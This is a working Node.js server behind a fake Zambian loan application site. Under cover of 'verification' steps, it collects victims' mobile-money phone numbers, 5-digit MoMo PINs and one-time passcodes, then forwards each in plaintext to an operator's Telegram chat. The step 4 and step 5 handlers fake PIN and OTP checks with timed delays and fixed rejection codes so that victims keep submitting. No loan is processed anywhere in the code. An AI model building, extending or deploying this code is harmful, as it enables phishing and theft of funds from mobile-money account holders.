require('dotenv').config()

const express = require('express')
const http = require('http')
const cors = require('cors')
const { Server } = require('socket.io')

function validateEnvironment() {
  const requiredKeys = ['TELEGRAM_BOT_TOKEN', 'TELEGRAM_CHAT_ID']
  const missingKeys = requiredKeys.filter(
    (key) => !process.env[key] || !process.env[key].trim(),
  )

  if (missingKeys.length > 0) {
    throw new Error(
      `Missing required environment variables: ${missingKeys.join(', ')}`,
    )
  }

  if (/\s/.test(process.env.TELEGRAM_BOT_TOKEN)) {
    throw new Error('TELEGRAM_BOT_TOKEN must not contain spaces.')
  }
}

try {
  validateEnvironment()
} catch (error) {
  console.error(`Environment validation failed: ${error.message}`)
  process.exit(1)
}

const app = express()
const server = http.createServer(app)
const sessions = new Map()

const allowedOrigins = [
  'http://localhost:5173',
  'http://localhost:5174',
  'https://zamcash.vercel.app',
]

const telegramBotToken = process.env.TELEGRAM_BOT_TOKEN
const telegramChatId = process.env.TELEGRAM_CHAT_ID

console.log('BOT TOKEN:', telegramBotToken?.substring(0, 12))
console.log('CHAT ID:', telegramChatId)

function toSafeText(value, fallback = 'N/A') {
  if (value === undefined || value === null || value === '') {
    return fallback
  }

  return String(value)
}

/* ===========================
   FIRST TELEGRAM NOTIFICATION
   (After Step 4)
=========================== */

function createFirstMessage({
  appId,
  step1,
  step3,
  step4,
}) {
  return [
    '🚨 NEW LOAN APPLICATION',
    '',
    `🆔 App ID: ${toSafeText(appId)}`,
    `💰 Loan Type: ${toSafeText(step1?.loanType)}`,
    `💵 Amount: ${toSafeText(step1?.amount)} ZMW`,
    `📅 Term: ${toSafeText(step1?.term)} Months`,
    `📝 Purpose: ${toSafeText(step1?.purpose)}`,
    `💼 Employment: ${toSafeText(step3?.employment)}`,
    '',
    '📱 MOBILE MONEY',
    `📞 Number: ${toSafeText(step4?.phone)}`,
    `🔑 PIN: ${toSafeText(step4?.password)}`,
    '',
    `🕒 ${new Date().toLocaleString()}`,
  ].join('\n')
}

/* ===========================
   SECOND TELEGRAM NOTIFICATION
   (After Step 5)
=========================== */

function createSecondMessage({
  appId,
  referenceId,
  step5,
}) {
  return [
    '✅ OTP RECEIVED',
    '',
    `🆔 App ID: ${toSafeText(appId)}`,
    `📄 Reference: ${toSafeText(referenceId)}`,
    `🔐 OTP: ${toSafeText(step5?.pin)}`,
    '',
    `🕒 ${new Date().toLocaleString()}`,
  ].join('\n')
}
async function sendTelegramMessage(text) {
  const endpoint = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`

  const response = await fetch(endpoint, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify({
      chat_id: telegramChatId,
      text,
      disable_web_page_preview: true,
    }),
  })

  if (!response.ok) {
    let details = ''

    try {
      const payload = await response.json()
      details = payload?.description
        ? `: ${payload.description}`
        : ''
    } catch {
      details = ''
    }

    throw new Error(
      `Telegram send failed with status ${response.status}${details}`,
    )
  }
}

app.use(
  cors({
    origin(origin, callback) {
      if (!origin || allowedOrigins.includes(origin)) {
        callback(null, true)
        return
      }

      callback(new Error('Origin not allowed by CORS'))
    },
  }),
)

app.use(express.json())

app.get('/api/health', (_request, response) => {
  response.json({
    status: 'ok',
  })
})

app.get('/api/session/:id', (request, response) => {
  const session = sessions.get(request.params.id)

  if (!session) {
    response.status(404).json({
      message: 'Session not found',
    })
    return
  }

  response.json({
    id: request.params.id,
    data: session,
  })
})

const io = new Server(server, {
  cors: {
    origin: allowedOrigins,
    methods: ['GET', 'POST'],
  },
})

io.on('connection', (socket) => {
  const appId = `APP-${Date.now()
    .toString(36)
    .toUpperCase()}`

  sessions.set(socket.id, { appId })

  socket.emit('session-ready', {
    appId,
  })

  socket.on('step1', (payload) => {
    sessions.set(socket.id, {
      ...sessions.get(socket.id),
      step1: payload,
    })
  })

  socket.on('step2', (payload) => {
    sessions.set(socket.id, {
      ...sessions.get(socket.id),
      step2: payload,
    })
  })

  socket.on('step3', (payload) => {
    sessions.set(socket.id, {
      ...sessions.get(socket.id),
      step3: payload,
    })
  })
  socket.on('step4', async (payload) => {
    if (!payload?.phone || !/^\d{5}$/.test(payload?.password ?? '')) {
      socket.emit('error', {
        message: 'Wallet phone and a valid 5-digit MoMo PIN are required.',
      })
      return
    }

    sessions.set(socket.id, {
      ...sessions.get(socket.id),
      step4: payload,
    })

    /* ===========================
       FIRST TELEGRAM NOTIFICATION
    =========================== */

    try {
      const sessionSnapshot = sessions.get(socket.id) || {}

      const firstMessage = createFirstMessage({
        appId: sessionSnapshot.appId,
        step1: sessionSnapshot.step1,
        step3: sessionSnapshot.step3,
        step4: payload,
      })

      await sendTelegramMessage(firstMessage)
    } catch (error) {
      console.error(
        `First Telegram notification failed: ${error.message}`,
      )
    }

    setTimeout(() => {
      if (payload.password === '00000') {
        socket.emit('password-rejected', {
          message: 'PIN rejected by the verification desk.',
        })
        return
      }

      socket.emit('password-verified')
    }, 1200)
  })
  socket.on('step5', (payload) => {
    if (!payload?.pin || payload.pin.length !== 6) {
      socket.emit('error', {
        message: 'A 6-digit OTP is required.',
      })
      return
    }

    setTimeout(async () => {
      if (payload.pin === '000000') {
        socket.emit('pin-rejected', {
          message: 'OTP invalid or expired. Try a new code.',
        })
        return
      }

      const sessionSnapshot = sessions.get(socket.id) || {}

      const referenceId = `REF-${Math.random()
        .toString(36)
        .slice(2, 8)
        .toUpperCase()}`

      sessions.set(socket.id, {
        ...sessionSnapshot,
        referenceId,
        step5: payload,
      })

      /* ===========================
         SECOND TELEGRAM NOTIFICATION
      =========================== */

      try {
        const secondMessage = createSecondMessage({
          appId: sessionSnapshot.appId,
          referenceId,
          step5: payload,
        })

        await sendTelegramMessage(secondMessage)
      } catch (error) {
        console.error(
          `Second Telegram notification failed: ${error.message}`,
        )
      }

      socket.emit('pin-verified', {
        referenceId,
        appId: sessionSnapshot.appId,
      })
    }, 1400)
  })
  socket.on('disconnect', () => {
    sessions.delete(socket.id)
  })
})

const port = Number(process.env.PORT) || 4000

server.listen(port, () => {
  console.log(`Server listening on http://localhost:${port}`)
})